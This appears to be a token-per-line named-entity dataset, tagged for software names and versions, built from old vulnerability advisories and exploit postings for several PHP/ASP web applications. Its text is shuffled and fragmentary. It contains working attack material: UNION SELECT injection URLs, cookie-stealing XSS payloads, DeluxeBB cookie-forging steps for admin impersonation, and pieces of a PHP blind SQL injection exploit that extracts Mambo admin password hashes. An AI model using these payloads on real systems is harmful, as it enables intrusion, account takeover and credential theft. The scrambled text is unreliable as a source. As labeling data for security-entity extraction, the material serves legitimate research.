/name= O
postcode O
size= O
30 O
class= O
gray_back O
value O

> O
/ O
) O
{ O
print O
+ O
Exploit O
succeed O
! O

> O
/ O
) O
{ O
print O
+ O
Address1 O
: O
$ O
1 O
; O
} O
if O
( O
$ O
answer O
=~ O
/name= O
city O
size= O
30 O
class= O
gray_back O
value O

> O
/ O
) O
{ O
print O
+ O
Country O
: O
$ O
1 O
; O
} O
if O
( O
$ O
answer O
=~ O
/name= O
phone O
size= O
30 O
class= O
gray_back O
value O

> O
/ O
) O
{ O
print O
+ O
Address1 O
: O
$ O
1 O
; O
} O
if O
( O
$ O
answer O
=~ O
/name= O
address2 O
size= O
30 O
class= O
gray_back O
value O

> O
/ O
) O
{ O
print O
+ O
Phone O
: O
$ O
1 O
; O
} O
if O
( O
$ O
answer O
=~ O
/name= O
iurl O
size= O
24 O
class= O
gray_back O
value O

DigiAffiliate SN
1.4 SV
- O
id O
SQL O
Injection O

SQL O
injection O
vulnerability O
in O
etkinlikbak.asp O
in O
Okul SN
Web SN
Otomasyon SN
Sistemi SN
4.0.1 SV
allows O
remote O
attackers O
to O
execute O
arbitrary O
SQL O
commands O
via O
the O
id O
parameter O
. O

Script O
: O
Okul O
Web O
Otomasyon O
Sistemi O
Script O
Download O
: O
ilker O
Kandemir O
< O
ilkerkandemir O
[ O
at O
] O
mynet.com O
DORK O
: O
inurl O
: O
etkinlikbak.asp O
Exploit O
: O
etkinlikbak.asp O
id=-1 O
% O
20union O
% O
20select O
% O
200 O
, O
editor O
, O
sifre,3,4,5 O
% O
20from O
% O
20editor O
Editor O
Panel O
: O
editor_gir.asp O
Tnx O
: O
H0tturk O
, O
Dr.Max O
Virus O
, O
,PcDelisi O
, O
CodeR O
, O
Dumenci O
Special O
Tnx O
: O
Asianeagle O
, O
AYYILDIZ.ORG O
milw0rm.com O
[ O
2007-01-15 O
] O

AYYILDIZ.ORG O
PreSents O
... O

Okul SN
Web SN
Otomasyon SN
Sistemi SN
4.0.1 SV
- O
SQL O
Injection O

Script O
: O
Okul O
Web O
Otomasyon O
Sistemi O
Script O
Download O
: O
Contact O
: O
ilker O
Kandemir O
< O
ilkerkandemir O
[ O
at O
] O
mynet.com O
DORK O
: O
inurl O
: O
etkinlikbak.asp O
Exploit O
: O
etkinlikbak.asp O
id=-1 O
% O
20union O
% O
20select O
% O
200 O
, O
editor O
, O
sifre,3,4,5 O
% O
20from O
% O
20e O
ditor O
Editor O
Panel O
: O
editor_gir.asp O
Tnx O
: O
H0tturk O
, O
Dr.Max O
Virus O
, O
Asianeagle O
, O
PcDelisi O
, O
CodeR O
Special O
Tnx O
: O
AYYILDIZ.ORG O

AYYILDIZ.ORG O
PreSents O
... O

Okul O
Web O
Otomasyon O
Sistemi O
( O
etkinlikbak.asp O
) O
SQL O
Injection O
Vulnerability O

Multiple O
SQL O
injection O
vulnerabilities O
in O
Future O
Internet O
allow O
remote O
attackers O
to O
execute O
arbitrary O
SQL O
commands O
via O
the O
( O
1 O
) O
newsId O
or O
( O
2 O
) O
categoryid O
parameter O
in O
a O
Portal.Showpage O
action O
in O
index.cfm O
, O
or O
( O
3 O
) O
the O
langId O
parameter O
in O
index.cfm O
. O

Vulnerable O
: O
Future O
Internet O
web O
: O
SQL O
Injection O
: O
ge O
& O
categoryid=311 O
& O
newsId= O
[ O
SQL O
] O
ge O
& O
categoryid= O
[ O
SQL O
] O
XSS O
: O
ge O
& O
categoryId= O
[ O
XSS O
] O
For O
example O
u O
can O
put O
: O
ge O
& O
categoryId= O
< O
script O
> O
alert O
( O
document.cookie O
) O
< O
/script O
Discovery O
by O
Linux_Drox O
( O
Qptan O
) O
S-H-T O

Multiple O
Bugs O
in O
Future O
Internet O
( O
XSS O
& O
SQL O
Injection O
) O

Multiple O
SQL O
injection O
vulnerabilities O
in O
index.php O
in O
dev4u O
CMS O
allow O
remote O
attackers O
to O
execute O
arbitrary O
SQL O
commands O
via O
the O
( O
1 O
) O
seite_id O
, O
( O
2 O
) O
gruppe_id.php O
, O
and O
( O
3 O
) O
go_target O
parameters O
. O

You O
should O
work O
with O
htmlspecialchars O
( O
) O
or O
htmlentities O
( O
) O
php-function O
to O
ensure O
that O
html O
tags O
are O
not O
going O
to O
be O
executed O
. O

Fix O
None O
known O
Solution O
Edit O
the O
source O
code O
to O
ensure O
that O
input O
is O
properly O
sanitised O
. O

You O
can O
find O
more O
Information O
on O
the O
MajorSecurity O
Project O
at O

SQL O
Injection O
: O
Input O
passed O
directly O
to O
the O
seite_id O
, O
gruppe_id.php O
and O
go_target O
parameter O
in O
index.php O
is O
not O
properly O
sanitised O
before O
being O
used O
in O
a O
SQL O
query O
. O

Example O
: O
$ O
pass O
= O
htmlentities O
( O
$ O
_POST O
[ O
pass O
test O
= O
htmlspecialchars O
( O
$ O
_GET O
( O
test O
id O
= O
intval O
( O
$ O
_POST O
[ O
id O

Vendor-Status O
: O
informed O
Advisory-Status O
: O
published O
Credits O
Discovered O
by O
: O
David O
Vieira-Kurz O
Original O
Advisory O
: O
Introduction O
dev4u O
CMS O
is O
a O
well O
known O
Content O
Management O
System O
. O

More O
Details O
Cross O
Site O
Scripting O
: O
Input O
passed O
directly O
to O
the O
user_name O
, O
passwort O
and O
go_target O
parameter O
in O
index.php O
is O
not O
properly O
sanitised O
before O
being O
returned O
to O
the O
user O
. O

You O
should O
also O
work O
with O
the O
intval O
( O
) O
and O
mysql_real_escape_string O
( O
) O
or O
addslashes O
( O
) O
php-function O
to O
ensure O
that O
sql O
statements O
can O
t O
be O
delivered O
over O
the O
get O
variables O
. O

Further O
it O
is O
recommend O
to O
set O
off O
the O
register O
globals O
option O
in O
the O
php.ini O
on O
your O
webserver O
. O

History/Timeline O
11.11.2006 O
discovery O
of O
the O
vulnerabilities O
11.11.2006 O
additional O
tests O
with O
other O
versions O
12.11.2006 O
contacted O
the O
vendor O
18.11.2006 O
advisory O
is O
written O
18.11.2006 O
advisory O
released O
MajorSecurity O
MajorSecurity O
is O
a O
German O
penetration O
testing O
and O
security O
research O
project O
which O
consists O
of O
only O
one O
person O
at O
the O
present O
time O
. O

[ O
MajorSecurity O
Advisory O
36 O
] O
dev4u O
CMS O
- O
Multiple O
SQL O
Injection O
and O
Cross O
Site O
Scripting O
Issues O
Details O
Product O
: O
dev4u O
CMS O
Security-Risk O
: O
moderated O
Remote-Exploit O
: O
yes O

This O
can O
be O
exploited O
to O
execute O
arbitrary O
HTML O
and O
script O
code O
in O
a O
user O
browser O
session O
in O
context O
of O
an O
affected O
site O
. O

[ O
MajorSecurity O
Advisory O
36 O
] O
dev4u O
CMS O
- O
Multiple O
SQL O
Injection O
and O
Cross O
Site O
Scripting O
Issues O

Multiple O
SQL O
injection O
vulnerabilities O
in O
ClickTech O
Click O
Gallery O
allow O
remote O
attackers O
to O
execute O
arbitrary O
SQL O
commands O
via O
the O
( O
1 O
) O
currentpage O
or O
( O
2 O
) O
gallery_id O
parameter O
to O
( O
a O
) O
view_gallery.asp O
, O
the O
( O
3 O
) O
image_id O
parameter O
to O
( O
b O
) O
download_image.asp O
, O
the O
currentpage O
or O
( O
5 O
) O
orderby O
parameter O
to O
( O
c O
) O
gallery.asp O
, O
or O
the O
currentpage O
parameter O
to O
( O
d O
) O
view_recent.asp O
. O

example O
in O
Search O
: O
< O
script O
> O
alert O
( O
Aria-Security O
) O
< O
/script O
Contact O
: O
Advisory O
( O
at O
) O
aria-security O
( O
dot O
) O
net O
[ O
email O
concealed O
] O

Aria-Security O
Team O
Advisory O
< O
For O
English O
< O
For O
Persian O
Software O
: O
Click O
Gallery O
Method O
: O
SQL O
Injection O
And O
XSS O
Vendor O
: O
ClickGallery.net O
PoC O
Injection O
] O
injection O
] O
Injection O
] O
Injection O
] O
Injection O
] O
Injection O
] O
You O
are O
able O
to O
use O
XSS O
by O
searching O
your O
script O
. O

ClickGallery O
Sql O
Injection O

SQL O
injection O
vulnerability O
in O
DeluxeBB SN
1.07 SV
and SV
earlier SV
allows O
remote O
attackers O
to O
bypass O
authentication O
, O
spoof O
users O
, O
and O
modify O
settings O
via O
the O
( O
1 O
) O
memberpw O
and O
( O
2 O
) O
membercookie O
cookies O
. O

Vendor O
URL O
: O
Authors O
: O
Jessica O
Hope O
( O
jessicasaulhope O
( O
at O
) O
googlemail O
( O
dot O
) O
com O
[ O
email O
concealed O
] O
) O
: O
Th3 O
M0ths O
( O
th3.m0ths O
( O
at O
) O
gmail O
( O
dot O
) O
com O
[ O
email O
concealed O
] O
) O
Overview O
Due O
to O
various O
failures O
in O
sanitising O
user O
input O
, O
it O
is O
possible O
to O
construct O
XSS O
attacks O
, O
SQL O
injection O
, O
authentication O
bypass O
, O
bypassing O
of O
default O
security O
checks O
, O
user O
spoofing O
, O
cookie O
poisoning O
and O
pollution O
of O
the O
global O
namespace O
. O

The O
protection O
is O
an O
strstr O
( O
case-sensitive O
) O
on O
UNION O
SELECT O
. O

Vendor O
test O
patch O
03rd O
July O
2006 O
: O

Vendor O
notified O
Credit O
This O
issue O
is O
to O
be O
credited O
to O
Jessica O
Hope O
( O
jessicasaulhope O
( O
at O
) O
googlemail O
( O
dot O
) O
com O
[ O
email O
concealed O
] O
) O
and O
Th3 O
M0ths O
( O
th3.m0ths O
( O
at O
) O
gmail O
( O
dot O
) O
com O
[ O
email O
concealed O
] O
) O

You O
do O
not O
need O
to O
be O
logged O
in O
to O
launch O
this O
attack O
, O
you O
just O
need O
to O
create O
the O
above O
cookies O
, O
and O
provide O
anything O
for O
the O
memberpw O
cookie O
( O
even O
a O
- O
will O
suffice O
) O
. O

User O
spoofing O
: O
It O
is O
possible O
to O
post O
as O
any O
other O
user O
without O
having O
to O
totally O
become O
that O
user O
. O

In O
addition O
to O
altering O
the O
cookies O
, O
if O
you O
were O
to O
register O
as O
a O
user O
with O
just O
a O
single O
space O
as O
the O
username O
, O
you O
would O
have O
the O
credentials O
, O
without O
the O
memberpw O
cookie O
being O
set O
. O

SQL O
Injection O
: O
Due O
to O
the O
way O
the O
cookies O
are O
used O
, O
most O
of O
the O
above O
attacks O
( O
authentication O
bypass O
, O
user O
spoofing O
, O
cookie O
poisoning O
) O
allow O
a O
basic O
set O
of O
SQL O
injection O
. O

The O
membercookie O
looks O
like O
this O
: O
membercookie O
: O
< O
script O
> O
alert O
( O
document.cookie O
) O
< O
/script O
You O
do O
have O
to O
have O
a O
valid O
memberpw O
and O
memberid O
cookie O
. O

You O
are O
now O
able O
to O
post O
as O
a O
guest O
user O
, O
while O
still O
having O
the O
other O
cookies O
. O

You O
will O
remain O
logged O
in O
as O
the O
user O
you O
originally O
logged O
in O
as O
. O

Here O
is O
the O
relevant O
settings O
required O
to O
spoof O
this O
user O
: O
memberid O
: O
4 O
membercookie O
: O
or O
All O
other O
cookies O
should O
be O
left O
alone O
. O

Vendor O
released O
patched O
version O
09th O
July O
2006 O
: O

However O
, O
it O
is O
programmed O
to O
be O
case O
sensitive O
, O
so O
bypassing O
the O
sensitivity O
can O
lead O
to O
SQL O
Injection O
. O

Vendor O
response O
02nd O
July O
2006 O
: O

The O
result O
of O
this O
means O
that O
you O
are O
able O
to O
change O
everyone O
e-mail O
, O
signature O
, O
location O
, O
website O
, O
other O
settings O
, O
and O
worst O
of O
all O
, O
you O
are O
able O
to O
change O
everyone O
password O
. O

This O
can O
be O
done O
by O
then O
going O
to O
the O
Member O
CP O
and O
changing O
anything O
. O

More O
advanced O
SQL O
injection O
could O
be O
possible O
due O
to O
the O
way O
the O
cookies O
are O
handled O
. O

I O
will O
leave O
this O
as O
an O
exercise O
to O
the O
reader O
in O
order O
to O
come O
up O
with O
some O
possible O
SQL O
. O

URL O
Redirection O
on O
login O
: O
In O
the O
redirect O
variable O
, O
it O
is O
possible O
to O
phish O
a O
user O
when O
they O
attempt O
to O
login O
. O

Cookie O
poisioning O
: O
If O
you O
set O
you O
cookies O
to O
the O
following O
, O
after O
logging O
in O
: O
membercookie O
: O
or O
Leaving O
the O
rest O
alone O
, O
you O
are O
able O
to O
change O
everyone O
settings O
. O

The O
method O
is O
nearly O
the O
same O
as O
above O
, O
except O
you O
do O
not O
need O
to O
alter O
the O
password O
cookie O
. O

Consider O
the O
user O
test O
with O
the O
memberid O
of O
4 O
. O

XSS O
in O
membercookie O
cookie O
: O
Setting O
the O
membercookie O
cookie O
to O
be O
any O
XSS O
causes O
the O
display O
forum O
and O
display O
topic O
to O
show O
the O
XSS O
as O
DeluxeBB O
trusts O
the O
membercookie O
over O
the O
memberid O
which O
gets O
passed O
through O
an O
intval O
( O
) O
in O
$ O
memberid O
= O
@ O
intval O
( O
$ O
memberid O
) O
; O
. O

In O
addition O
to O
this O
, O
it O
is O
not O
possible O
to O
ban O
by O
username O
; O
the O
user O
can O
not O
be O
found O
in O
the O
admin O
cp O
. O

Advisory O
: O
DeluxeBB O
mutiple O
vulnerabilities O
Release O
Date O
: O
July O
18th O
, O
2006 O
Application O
: O
DeluxeBB O
Version O
: O
Deluxe O
1.07 O
and O
previous O
versions O
Platform O
: O
PHP O

adsite.com O
Bypass O
SQL O
Injection O
Protection O
: O
There O
is O
basic O
SQL O
Injection O
protection O
on O
certain O
variables O
such O
as O
login O
. O

Here O
is O
the O
relevant O
settings O
required O
to O
become O
this O
user O
: O
membercookie O
: O
admin O
memberid O
: O
1 O
memberpw O
: O
or O
The O
exploit O
works O
because O
the O
SQL O
query O
done O
looks O
something O
like O
this O
: O
SELECT O
FROM O
deluxebb_users O
WHERE O
( O
uid= O
1 O
& O
& O
username= O
admin O
& O
& O
pass= O
or O
There O
are O
limits O
imposed O
on O
the O
memberpw O
, O
it O
must O
be O
shorter O
than O
33 O
characters O
. O

Using O
union O
select O
instead O
in O
the O
protected O
variables O
is O
a O
simple O
bypass O
. O

However O
, O
memberpw O
should O
only O
contain O
the O
MD5 O
sum O
of O
your O
password O
( O
something O
that O
should O
actually O
be O
changed O
, O
but O
that O
is O
a O
different O
section O
of O
this O
report O
) O
. O

Pollution O
of O
the O
global O
namespace O
: O
Due O
to O
the O
following O
lines O
, O
it O
is O
possible O
to O
use O
cookies O
in O
an O
attempt O
to O
overwrite O
data O
in O
the O
$ O
_GET O
, O
$ O
_POST O
, O
$ O
_SERVER O
and O
$ O
_ENV O
arrays O
: O
$ O
list O
= O
array O
( O
_GET O
, O
_POST O
, O
_ENV O
, O
_SERVER O
, O
_COOKIE O
, O
_FILES O
) O
; O
foreach O
( O
$ O
list O
as O
$ O
element O
) O
{ O
if O
( O
! O
empty O
( O
$ O
$ O
element O
) O
& O
& O
is_array O
( O
$ O
$ O
element O
) O
) O
{ O
extract O
( O
$ O
$ O
element O
This O
can O
allow O
someone O
to O
set O
a O
COOKIE O
variable O
to O
overwrite O
the O
previous O
variables O
, O
allowing O
SQL O
injection O
and O
XSS O
. O

Discussion O
Authentication O
bypass O
: O
It O
is O
possible O
for O
an O
attacker O
to O
become O
any O
user O
he O
or O
she O
wishes O
by O
creating O
a O
set O
of O
fake O
cookies O
. O

Consider O
the O
admin O
with O
memberid O
of O
1 O
and O
the O
name O
admin O
. O

DeluxeBB O
mutiple O
vulnerabilities O

SQL O
injection O
vulnerability O
in O
the O
Weblinks O
module O
( O
weblinks.php O
) O
in O
Mambo SN
4.6rc1 SV
and SV
earlier SV
allows O
remote O
attackers O
to O
execute O
arbitrary O
SQL O
commands O
via O
the O
title O
parameter O
. O

; O
} O
$ O
j=1 O
; O
$ O
admin= O
; O
while O
( O
! O
strstr O
( O
$ O
admin O
, O
chr O
( O
0 O
) O
) O
) O
{ O
for O
( O
$ O
i=0 O
; O
$ O
i O
< O
=255 O
; O
$ O
i O
starttime=time O
( O
) O
; O
$ O
sql= O
99999 O
UNION O
SELECT O
IF O
( O
( O
ASCII O
( O
SUBSTRING O
( O
username O
, O
. O
$ O
j O
. O
,1 O
) O
) O
= O
. O
$ O
i O
. O
) O

; O
if O
( O
$ O
difftime O
7 O
) O
{ O
$ O
password.=chr O
( O
$ O
i O
) O
; O
echo O
password O
- O
. O
$ O
password O

localhost O
/mambo O
username O
password O
; O
die O
; O
} O
explaination O
: O
sql O
injection O
in O
title O
argument O
when O
you O
submit O
a O
web O
link O
, O
poc O
: O
start O
mysql O
daemon O
with O
log O
option O
... O
> O
mysqld O
log=mambo.txt O
now O
login O
, O
go O
to O
Submit O
Weblink O
feature O
, O
in O
Name O
: O
field O
type O
: O
99999 O
UNION O
SELECT O
IF O
( O
( O
ASCII O
( O
SUBSTRING O
( O
password,1,1 O
) O
) O
=0 O
) O
& O
1 O
, O
benchmark O
( O
200000000 O
, O
CHAR O
( O
0 O
) O
) O
,0 O
) O
FROM O
mos_users O
WHERE O
usertype= O
Super O
Administrator O
in O
mambo.txt O
we O
have O
: O
13 O
Query O
SELECT O
id O
FROM O
mos_weblinks O
WHERE O
title= O
99999 O
UNION O
SELECT O
IF O
( O
( O
ASCII O
( O
SUBSTRING O
( O
password,1,1 O
) O
) O
=0 O
) O
& O
1 O
, O
benchmark O
( O
50000000 O
, O
CHAR O
( O
0 O
) O
) O
,0 O
) O
FROM O
mos_users O
WHERE O
usertype= O
Super O
Administrator O
AND O
catid= O
2 O
injection O
is O
blind O
but O
, O
as O
you O
can O
see O
, O
we O
can O
you O
use O
time O
delays O
through O
Mysql O
benchmark O
( O
) O
function O
to O
ask O
questions O
about O
tables O
this O
works O
regardless O
of O
magic_quotes_gpc O
settings O
error_reporting O
( O
0 O
) O
; O
ini_set O
( O
max_execution_time O
,0 O
) O
; O
ini_set O
( O
default_socket_timeout O
,5 O
) O
; O
function O
quick_dump O
( O
$ O
string O
) O
{ O
$ O
result O
exa O
cont=0 O
; O
for O

; O
$ O
packet.= O
$ O
data O
; O
debug O
echo O
quick_dump O
( O
$ O
packet O
) O
. O

! O
/usr/bin/php O
-q O
-d O
short_open_tag=on O
< O

echo O
Mambo O
< O
= O
4.6rc1 O
Weblinks O
blind O
SQL O
injection O
admin O
credentials O
; O
echo O
disclosure O
exploit O
( O
benchmark O
( O
) O
vesion O
) O
; O
echo O
by O
rgod O
rgod O
( O
at O
) O
autistici O
( O
dot O
) O
org O
[ O
email O
concealed O
] O
; O
echo O
site O
: O
echo O
this O
is O
called O
the O
Sun-Tzu O
trascendental O
guru O
meditation O
tecnique O
; O
if O
( O
$ O
argc O
< O
5 O
) O
{ O
echo O
Usage O
: O
php O
. O
$ O
argv O
. O

; O
sleep O
( O
2 O
) O
; O
break O
; O
} O
} O
if O
( O
$ O
i O
255 O
) O
{ O
die O
( O
Exploit O
failed O
j O
if O
you O
are O
here O
... O
echo O
Exploit O
succeeded O
echo O
n O
; O
echo O
admin O
- O
. O
$ O
admin O
. O

d O
{ O
1,3 O
} O
: O
d O
{ O
1,5 O
} O
b O
) O
; O
function O
sendpacketii O
( O
$ O
packet O
) O
{ O
global O
$ O
proxy O
, O
$ O
host O
, O
$ O
port O
, O
$ O
html O
, O
$ O
proxy_regex O
; O
if O
( O
$ O
proxy O
ock=fsockopen O
( O
gethostbyname O
( O
$ O
host O
) O
, O
$ O
port O
) O
; O
if O
( O
! O
$ O
ock O
) O
{ O
echo O
No O
response O
from O
. O
$ O
host O
. O

users O
WHERE O
usertype= O
Super O
Administrator O
; O
echo O
. O
$ O
sql O
. O

host O
path O
user O
pass O
OPTIONS O
; O
echo O
host O
: O
target O
server O
( O
ip/hostname O
) O
; O
echo O
path O
: O
path O
to O
Mambo O
; O
echo O
user/pass O
: O
you O
need O
an O
account O
; O
echo O
Options O
: O
; O
echo O
-T O
[ O
prefix O
] O
specify O
a O
table O
prefix O
different O
from O
mos O
echo O
-p O
[ O
port O
] O
: O
specify O
a O
port O
other O
than O
80 O
; O
echo O
-P O
[ O
ip O
: O
port O
] O
: O
specify O
a O
proxy O
; O
echo O
Example O
: O
; O
echo O
php O
. O
$ O
argv O
. O

; O
$ O
packet.= O
$ O
data O
; O
sendpacketii O
( O
$ O
packet O
) O
; O
$ O
temp=explode O
( O
Set-Cookie O
: O
, O
$ O
html O
) O
; O
$ O
cookie= O
; O
for O
( O
$ O
i=1 O
; O
$ O
i O
< O
=count O
( O
$ O
temp O
) O
-1 O
; O
$ O
i O
temp2=explode O
( O
, O
$ O
temp O
[ O
$ O
i O
] O
) O
; O
$ O
cookie O
temp2 O
; O
} O
if O
( O
( O
strstr O
( O
$ O
cookie O
cookie O
) O
{ O
die O
( O
Unable O
to O
login O
else O
{ O
echo O
Done O
... O
cookie O
- O
. O
$ O
cookie O
. O

; O
$ O
packet.= O
Accept O
: O
text/plain O
; O
$ O
packet.= O
Connection O
: O
Close O
; O
$ O
packet.= O
Content-Type O
: O
application/x-www-form-urlencoded O
; O
$ O
packet.= O
Content-Length O
: O
.strlen O
( O
$ O
data O
) O
. O

; O
if O
( O
$ O
difftime O
7 O
) O
{ O
$ O
admin.=chr O
( O
$ O
i O
) O
; O
echo O
admin O
- O
. O
$ O
admin O

index.php O
HTTP/1.0 O
; O
$ O
packet.= O
User-Agent O
: O
Googlebot/2.1 O
; O
$ O
packet.= O
Host O
: O
. O
$ O
host O
. O

HTTP/1.0 O
; O
$ O
packet.= O
Host O
: O
. O
$ O
host O
. O

& O
1 O
, O
benchmark O
( O
200000000 O
, O
CHAR O
( O
0 O
) O
) O
,0 O
) O
FROM O
. O
$ O
prefix O
. O

; O
$ O
sql=urlencode O
( O
$ O
sql O
) O
; O
$ O
data O
= O
title= O
. O
$ O
sql O
; O
$ O
data.= O
& O
catid=2 O
; O
$ O
data.= O
& O
url= O
$ O
data.= O
& O
description= O
; O
$ O
data.= O
& O
id=0 O
; O
$ O
data.= O
& O
option=com_weblinks O
; O
$ O
data.= O
& O
task=save O
; O
$ O
data.= O
& O
ordering=0 O
; O
$ O
data.= O
& O
approved=0 O
; O
$ O
data.= O
& O
Returnid=0 O
; O
$ O
packet O
= O
POST O
. O
$ O
p O
. O

; O
$ O
difftime= O
$ O
endtime O
- O
$ O
starttime O
; O
echo O
difftime O
- O
. O
$ O
difftime O
. O

; O
die O
; O
} O
if O
( O
$ O
proxy O
p= O
$ O
path O
; O
} O
else O
{ O
$ O
p= O
$ O
data O
= O
username= O
. O
$ O
user O
; O
$ O
data.= O
& O
passwd= O
. O
$ O
pass O
; O
$ O
data.= O
& O
remember=yes O
; O
$ O
data.= O
& O
option=login O
; O
$ O
data.= O
& O
Submit=login O
; O
$ O
data.= O
& O
op2=login O
; O
$ O
data.= O
& O
lang=english O
; O
$ O
data.= O
& O
return= O
.urlencode O
( O
$ O
data.= O
& O
message=0 O
; O
$ O
packet O
= O
POST O
. O
$ O
p O
. O

; O
sleep O
( O
2 O
) O
; O
break O
; O
} O
more O
than O
seven O
seconds O

we O
succeed O
... O
if O
( O
$ O
i O
255 O
) O
{ O
die O
( O
Exploit O
failed O
j O
md5s O
=0 O
; O
null O
$ O
md5s=array_merge O
( O
$ O
md5s O
, O
range O
( O
48,57 O
) O
) O
; O
numbers O
$ O
md5s=array_merge O
( O
$ O
md5s O
, O
range O
( O
97,102 O
) O
) O
; O
a-f O
letters O
print_r O
( O
array_values O
( O
$ O
md5s O
) O
) O
; O
$ O
j=1 O
; O
$ O
password= O
; O
while O
( O
! O
strstr O
( O
$ O
password O
, O
chr O
( O
0 O
) O
) O
) O
{ O
for O
( O
$ O
i=0 O
; O
$ O
i O
< O
=255 O
; O
$ O
i++ O
) O
{ O
if O
( O
in_array O
( O
$ O
i O
, O
$ O
md5s O
) O
) O
{ O
$ O
starttime=time O
( O
) O
; O
$ O
sql= O
99999 O
UNION O
SELECT O
IF O
( O
( O
ASCII O
( O
SUBSTRING O
( O
password O
, O
. O
$ O
j O
. O
,1 O
) O
) O
= O
. O
$ O
i O
. O
) O

; O
echo O
n O
; O

; O
echo O
password O
( O
md5 O
password O
. O

proxy O
ock=fsockopen O
( O
$ O
parts O
, O
$ O
parts O
) O
; O
if O
( O
! O
$ O
ock O
) O
{ O
echo O
No O
response O
from O
proxy O
... O
; O
die O
; O
} O
} O
fputs O
( O
$ O
ock O
, O
$ O
packet O
) O
; O
if O
( O
$ O
proxy O
html O
while O
( O
! O
feof O
( O
$ O
ock O
) O
) O
{ O
$ O
html.=fgets O
( O
$ O
ock O
else O
{ O
$ O
html O
while O
( O
( O
! O
feof O
( O
$ O
ock O
) O
) O
or O
( O
! O
eregi O
( O
chr O
( O
0x0d O
) O
.chr O
( O
0x0a O
) O
.chr O
( O
0x0d O
) O
.chr O
( O
0x0a O
) O
, O
$ O
html O
html.=fread O
( O
$ O
ock,1 O
fclose O
( O
$ O
ock O
) O
; O
debug O
echo O
. O
$ O
html O
; O
} O
function O
is_hash O
( O
$ O
hash O
) O
{ O
if O
( O
ereg O
( O
^ O
[ O
a-f0-9 O
] O
{ O
32 O
} O
, O
trim O
( O
$ O
hash O
) O
) O
) O
{ O
return O
true O
; O
} O
else O
{ O
return O
false O
; O
} O
} O
$ O
host= O
$ O
argv O
; O
$ O
path= O
$ O
argv O
; O
$ O
user= O
$ O
argv O
; O
$ O
pass= O
$ O
argv O
; O
$ O
port=80 O
; O
$ O
prefix= O
mos_ O
; O
$ O
proxy= O
; O
for O
( O
$ O
i=5 O
; O
$ O
i O
< O
= O
$ O
argc-1 O
; O
$ O
i++ O
) O
{ O
$ O
temp= O

; O
sendpacketii O
( O
$ O
packet O
) O
; O
$ O
endtime=time O
( O
) O
; O
echo O
endtime O
- O
. O
$ O
endtime O
. O

original O
url O
: O

; O
$ O
packet.= O
Accept O
: O
text/plain O
; O
$ O
packet.= O
Connection O
: O
Close O
; O
$ O
packet.= O
Content-Type O
: O
application/x-www-form-urlencoded O
; O
$ O
packet.= O
Cookie O
: O
. O
$ O
cookie O
. O

Mambo SN
< SV
= SV
4.6rc1 SV
sql O
injection O

Multiple O
SQL O
injection O
vulnerabilities O
in O
phpTRADER SN
4.9 SV
SP5 SV
and SV
earlier SV
allow O
remote O
attackers O
to O
execute O
arbitrary O
SQL O
commands O
via O
the O
( O
1 O
) O
sectio O
parameter O
in O
( O
a O
) O
login.php O
, O
( O
b O
) O
write_newad.php O
, O
( O
c O
) O
newad.php O
, O
( O
d O
) O
printad.php O
, O
( O
e O
) O
askseller.php O
, O
( O
f O
) O
browse.php O
, O
( O
g O
) O
showmemberads.php O
, O
( O
h O
) O
note_ad.php O
, O
( O
i O
) O
abuse.php O
, O
( O
j O
) O
buynow.php O
, O
( O
k O
) O
confirm_newad.php O
, O
( O
2 O
) O
an O
parameter O
in O
( O
l O
) O
printad.php O
, O
( O
m O
) O
note_ad.php O
, O
( O
3 O
) O
who O
parameter O
in O
( O
n O
) O
showmemberads.php O
, O
and O
( O
4 O
) O
adnr O
parameter O
in O
( O
o O
) O
buynow.php O
. O

SQL O
injection O
vulnerability O
in O
controlpanel/index.php O
in O
CMS SN
Mundo SN
before SV
1.0 SV
build SV
008 SV
allows O
remote O
attackers O
to O
execute O
arbitrary O
SQL O
commands O
via O
the O
username O
parameter O
. O

Successful O
exploitation O
requires O
access O
to O
the O
administration O
section O
. O

Vendor O
confirms O
vulnerabilities O
. O

4 O
) O
Solution O
Update O
to O
version O
1.0 O
build O
008 O
. O

14/06/2006 O
- O
Public O
disclosure O
. O

8 O
) O
About O
Secunia O
Secunia O
collects O
, O
validates O
, O
assesses O
, O
and O
writes O
advisories O
regarding O
all O
the O
latest O
software O
vulnerabilities O
disclosed O
to O
the O
public O
. O

providing O
admin O
as O
the O
username O
together O
with O
an O
empty O
password O
) O
. O

Affected O
Software O
1 O
Severity O
2 O
Description O
of O
Vulnerabilities O
3 O
Solution O
4 O
Time O
Table O
5 O
Credits O
6 O
References O
7 O
About O
Secunia O
8 O
Verification O
9 O
1 O
) O

The O
vulnerabilities O
have O
been O
confirmed O
in O
version O
1.0 SV
build SV
007 SV
. O

Secunia O
Research O
14/06/2006 O
- O
CMS O
Mundo O
SQL O
Injection O
and O
File O
Upload O
Vulnerabilities O
- O
Table O
of O
Contents O

6 O
) O
Credits O
Discovered O
by O
Andreas O
Sandblad O
, O
Secunia O
Research O
. O

2 O
) O
An O
input O
validation O
error O
in O
the O
image O
upload O
handling O
in O
the O
image O
gallery O
can O
be O
exploited O
to O
upload O
arbitrary O
PHP O
scripts O
to O
a O
predictable O
location O
inside O
the O
web O
root O
. O

Successful O
exploitation O
requires O
that O
magic_quotes_gpc O
is O
disabled O
. O

Prior O
versions O
may O
also O
be O
affected O
. O

Affected O
Software O
CMS SN
Mundo SN
1.0 SV
build SV
007 SV
Prior SV
versions SV
may O
also O
be O
affected O
. O

1 O
) O
Input O
passed O
to O
the O
username O
parameter O
in O
controlpanel O
during O
login O
isn O
t O
properly O
sanitised O
before O
being O
used O
in O
a O
SQL O
query O
. O

7 O
) O
References O
The O
Common O
Vulnerabilities O
and O
Exposures O
( O
CVE O
) O
project O
has O
assigned O
CVE-2006-2911 O
( O
SQL O
injection O
) O
and O
CVE-2006-2931 O
( O
arbitrary O
file O
upload O
) O
for O
the O
vulnerabilities O
. O

These O
advisories O
are O
gathered O
in O
a O
publicly O
available O
database O
at O
the O
Secunia O
website O
: O
Secunia O
offers O
services O
to O
our O
customers O
enabling O
them O
to O
receive O
all O
relevant O
vulnerability O
information O
to O
their O
specific O
system O
configuration O
. O

This O
can O
further O
be O
exploited O
to O
bypass O
the O
authentication O
process O
and O
access O
the O
administration O
section O
( O
by O
e.g O
. O

5 O
) O
Time O
Table O
30/05/2006 O
- O
Initial O
vendor O
notification O
. O

Secunia O
offers O
a O
FREE O
mailing O
list O
called O
Secunia O
Security O
Advisories O
: O
9 O
) O
Verification O
Please O
verify O
this O
advisory O
by O
visiting O
the O
Secunia O
website O
: O
Complete O
list O
of O
vulnerability O
reports O
published O
by O
Secunia O
Research O
: O

A O
combination O
of O
vulnerabilities O
1 O
and O
2 O
can O
be O
exploited O
by O
